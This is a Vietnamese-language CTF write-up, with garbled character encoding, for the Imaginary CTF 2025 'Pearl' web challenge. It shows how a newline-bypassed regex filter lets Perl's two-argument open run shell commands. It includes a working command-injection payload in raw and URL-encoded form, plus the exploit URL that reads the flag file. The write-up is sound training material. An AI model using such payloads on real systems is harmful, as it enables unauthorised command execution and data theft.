---
title: "Web / Pearl - Imaginary CTF 2025"
excerpt: "A writeup on the Web / Pearl challenge from Imaginary CTF 2025"
category:
  - "Writeups"
tags:
  - "CTF"
  - "Web"
  - "Perl"
  - "Command Injection"
  - "2025"
authors:
    - "harshfeudal"
---

## Äá» bÃ i

*pearl (100pts)*

*Description*

*I used perl to make my pearl shop. Soon, we will expand to sellingÂ Perler beadÂ renditions ofÂ Perlin noise.*

*http://pearl.chal.imaginaryctf.org (link might expired)*

## HÆ°á»›ng giáº£i

BÃ i nÃ y thÃ¬ á»Ÿ má»©c easy thoi nhÆ°ng mÃ  viáº¿t cho cÃ³ blog :D

BÃ i nÃ y thÃ¬ Ä‘á» cÃ³ cho source code nÃªn cÅ©ng khÃ¡ lÃ  Ä‘Æ¡n giáº£n thoi. Má»i ngÆ°á»i cÃ³ thá»ƒ nhÃ¬n sÆ¡ qua cÃ¡i cáº¥u trÃºc cá»§a Ä‘á» cho Ä‘á»ƒ cÃ³ thÃªm gá»£i Ã½ tÃ¬m flag trÃªn server:

![image.png](image.png)

ThÃ¬ cÃ³ thá»ƒ tháº¥y á»Ÿ Ä‘Ã¢y, cÃ¡i file flag.txt nÃ³ náº±m ngay luÃ´n file pearl (cÃ³ Ä‘uÃ´i `.pl`). Pearl lÃ  má»™t ngÃ´n ngá»¯ láº­p trÃ¬nh web khÃ¡ phá»• biáº¿n (ngÃ y xÆ°a), hiá»‡n thÃ¬ váº«n cÃ³ má»™t sá»‘ trang cÃ²n duy trÃ¬ nÃ³ chá»© khÃ´ng háº³n lÃ  quÃ¡ dead, nhÆ°ng khÃ¡ hiáº¿m.

BÃ i nÃ y thÃ¬ viá»‡c báº¡n nhÃ¬n source code ra thÃ¬ báº¡n pháº£i nhÃ¬n luÃ´n cáº£ file `Dockerfile`, Ä‘Ã¢y lÃ  má»™t file Ä‘Ã³ng vai trÃ² nhÆ° má»™t con thuyá»n Ä‘á»ƒ â€œshipâ€ project cá»§a báº¡n lÃªn trÃªn server host cho tiá»‡n.

MÃ¬nh sáº½ Ä‘i sÃ¢u vÃ o `Dockerfile` trÆ°á»›c khi Ä‘á»c source code Ä‘á»ƒ cho biáº¿t cÃ¡ch setup server:

```docker
WORKDIR /app
COPY server.pl /app/server.pl
COPY files/ /app/files/
COPY flag.txt /
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt
```

CÃ³ thá»ƒ Ä‘á»ƒ Ã½ dÃ²ng cuá»‘i cÃ¹ng cá»§a Ä‘oáº¡n code trÃªn, cÃ¡c báº¡n sáº½ tháº¥y cÃ¢u `/flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt` nghÄ©a lÃ  nÃ³ Ä‘á»•i tÃªn cá»§a cÃ¡i file, do Ä‘Ã³ cÃ¡c báº¡n cÃ³ tÃ¬m ra Ä‘Æ°á»£c lá»— há»ng Ä‘i chÄƒng ná»¯a mÃ  search Ä‘Ãºng cÃ¡i tÃªn `flag.txt` thÃ¬ sáº½ khÃ´ng bao giá» ra. CÃ¡i tÃªn cá»§a file Ä‘Ã³ lÃºc sau sáº½ Ä‘Æ°á»£c Ä‘á»•i thÃ nh `flag-{...}` vá»›i trong ngoáº·c Ä‘Ã³ lÃ  cÃ¡i gÃ¬ gÃ¬ Ä‘Ã³ cá»§a cÃ¡i mÃ£ MD5 Ä‘Ã£ Ä‘Æ°á»£c encrypt.

NhÃ¬n vÃ o trong file `server.pl` thÃ¬ cÃ¡c báº¡n sáº½ tháº¥y nhá»¯ng Ä‘iá»u nhÆ° sau:

- Äá» sá»­ dá»¥ng hÃ m `open` hai Ä‘á»‘i sá»‘ cá»§a Perl Ä‘á»ƒ Ä‘á»c tá»‡p tin (`open(my $fh, $fullpath)`). ÄÃ¢y lÃ  má»™t hÃ m nguy hiá»ƒm vÃ¬ nÃ³ cÃ³ thá»ƒ diá»…n giáº£i cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t trong Ä‘Æ°á»ng dáº«n tá»‡p Ä‘á»ƒ thá»±c thi lá»‡nh há»‡ thá»‘ng.
- Äá» cÃ²n cÃ³ má»™t bá»™ lá»c báº±ng biá»ƒu thá»©c chÃ­nh quy (regex) Ä‘á»ƒ ngÄƒn cháº·n cÃ¡c kÃ½ tá»± Ä‘á»™c háº¡i, nhÆ°ng á»Ÿ Ä‘Ã¢y nÃ³ láº¡i khÃ´ng cháº·n kÃ­ tá»± xuá»‘ng dÃ²ng (háº¹ háº¹ háº¹). In case cÃ¡c báº¡n khÃ´ng biáº¿t thÃ¬ Ä‘Ã¢y:

```perl
if ($fullpath =~ /\.\.|[,\`\)\(;&]|\|.*\|/) {
    $c->send_error(RC_BAD_REQUEST, "Invalid path");
    next;
}
```

NhiÃªu Ä‘Ã¢y dá»¯ kiá»‡n thÃ¬ Ä‘á»§ Ä‘á»ƒ exploit rÃ²i~

Tháº­t ra á»Ÿ Ä‘Ã¢y, server luÃ´n thÃªm tiá»n tá»‘ `./files/` vÃ o Ä‘Æ°á»ng dáº«n. Náº¿u chÃºng ta chá»‰ gá»­i payload nhÆ° `cat /flag-*.txt|`, thÃ¬ server sáº½ chuyá»ƒn thÃ nh `./files/cat /flag-*.txt`, vÃ  command nÃ y sáº½ tháº¥t báº¡i do `./files/cat` khÃ´ng tá»“n táº¡i trÃªn Ä‘Ã³. ChÃ­nh vÃ¬ tháº¿ mÃ  mindset chÃºng ta sáº½ gá»­i lÃ  nhÆ° sau:

```

sh -c "cat /flag-*.txt"
|
```

KhÃ´ng pháº£i mÃ¬nh cá»‘ tÃ¬nh spacing á»Ÿ trÃªn Ä‘Ã¢u, mÃ  lÃ  pháº£i xuá»‘ng dÃ²ng nhÆ° váº­t Ã¡ ğŸ¥²

VÃ  Ä‘á»ƒ Ã½ lÃ  mÃ¬nh pháº£i cÃ³ cÃ¡i dáº¥u `|` Ä‘á»ƒ activate cÃ¡i lá»‡nh cá»§a mÃ¬nh, khÃ´ng cÃ³ cÃ¡i dáº¥u Ä‘Ã³ lÃ  bá»‹ bÃ¡o lá»—i ngay, do Ä‘Ã¢y lÃ  command injection trong Perl, báº¡n cÃ³ thá»ƒ tÃ¬m hiá»ƒu táº¡i [Ä‘Ã¢y](https://github.com/payloadbox/command-injection-payload-list).

Há»“i lÃºc nÃ£y mÃ¬nh cÃ³ nÃ³i má»™t sá»‘ cÃ¡i command Ä‘Ã£ bá»‹ blacklist, do Ä‘Ã³ cÃ¡c báº¡n pháº£i dÃ¹ng Ä‘áº¿n kÄ© thuáº­t URL encoding. 

Link: [https://www.urlencoder.org/](https://www.urlencoder.org/)

Giá» báº¡n chá»‰ cáº§n paste vÃ o Ä‘Ã¢y:

![image.png](image%201.png)

Xong áº¥n encode sáº½ ra Ä‘Æ°á»£c chuá»—i kÃ­ tá»± sau:

```
%0Ash%20-c%20%22cat%20%2Fflag-%2A.txt%22%0A%7C
```

Tá»›i Ä‘Ã¢y báº¡n paste tháº³ng vÃ o link nhÆ° váº­y:

```
http://pearl.chal.imaginaryctf.org/%0Ash%20-c%20%22cat%20%2Fflag-%2A.txt%22%0A%7C
```

VÃ  báº¡n sáº½ hiá»‡n ra má»™t trang cÃ³ chá»©a flag :D

```
ictf{uggh_why_do_people_use_perl_1f023b129a22}
```

## Lá»i káº¿t

ÄÃ¢y lÃ  má»™t trong nhá»¯ng bÃ i váº­n dá»¥ng command injection tiÃªu biá»ƒu mÃ  cÃ¡c báº¡n nÃªn thá»­ nghiá»‡m náº¿u chÆ°a biáº¿t, tuy nhiÃªn thÃ¬ nhá»¯ng trang web ngÃ y nay sáº½ khÃ´ng cÃ²n bá»‹ hiá»‡n tráº¡ng nhÆ° váº­y ná»¯a (hoáº·c cÃ³ nhÆ°ng á»Ÿ má»©c Ä‘á»™ cá»±c hiáº¿m) :D

easy/10

<img src="image%202.png" alt="image.png" style="width: 30%; height: auto;" />
